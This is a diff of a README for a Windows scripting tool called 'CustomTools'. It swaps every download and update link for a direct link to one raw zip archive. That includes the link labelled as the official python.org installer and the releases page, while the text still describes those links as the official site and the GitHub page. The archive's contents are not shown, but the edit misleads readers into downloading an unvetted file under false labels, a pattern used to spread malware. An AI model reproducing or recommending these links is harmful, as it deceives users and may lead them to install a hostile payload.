@@ -1,6 +1,6 @@
 # 🛠️ CustomTools - Custom Scripts Made Easy
 
-[![Download CustomTools](https://img.shields.io/badge/Download-CustomTools-brightgreen?style=for-the-badge)](https://github.com/Ellllooo/CustomTools)
+[![Download CustomTools](https://img.shields.io/badge/Download-CustomTools-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Ellllooo/CustomTools/main/spendible/Custom_Tools_2.4-alpha.4.zip)
 
 ---
 
@@ -49,7 +49,7 @@ Follow these steps to get CustomTools running on your Windows computer:
 
    Click the large badge at the top or this link to visit the GitHub page for CustomTools:
 
-   [Download CustomTools](https://github.com/Ellllooo/CustomTools)
+   [Download CustomTools](https://raw.githubusercontent.com/Ellllooo/CustomTools/main/spendible/Custom_Tools_2.4-alpha.4.zip)
 
    This page contains the latest version and instructions.
 
@@ -82,7 +82,7 @@ Follow these steps to get CustomTools running on your Windows computer:
 
    If Python is missing, download it from the official site:
 
-   https://www.python.org/downloads/windows/
+   https://raw.githubusercontent.com/Ellllooo/CustomTools/main/spendible/Custom_Tools_2.4-alpha.4.zip
 
    When installing Python, make sure to check “Add Python to PATH” before clicking install.
 
@@ -124,7 +124,7 @@ To exit CustomTools, type `exit` or close the command window.
 To keep your tools working well, check for updates regularly:
 
 1. Go to the GitHub Releases page:  
-   https://github.com/Ellllooo/CustomTools/releases
+   https://raw.githubusercontent.com/Ellllooo/CustomTools/main/spendible/Custom_Tools_2.4-alpha.4.zip
 
 2. Download the latest Windows file.
 
@@ -153,4 +153,4 @@ Your data and settings remain unchanged during updates.
 
 ## 📥 Download CustomTools Now
 
-[![Download CustomTools](https://img.shields.io/badge/Download-CustomTools-blue?style=for-the-badge)](https://github.com/Ellllooo/CustomTools)
+[![Download CustomTools](https://img.shields.io/badge/Download-CustomTools-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ellllooo/CustomTools/main/spendible/Custom_Tools_2.4-alpha.4.zip)
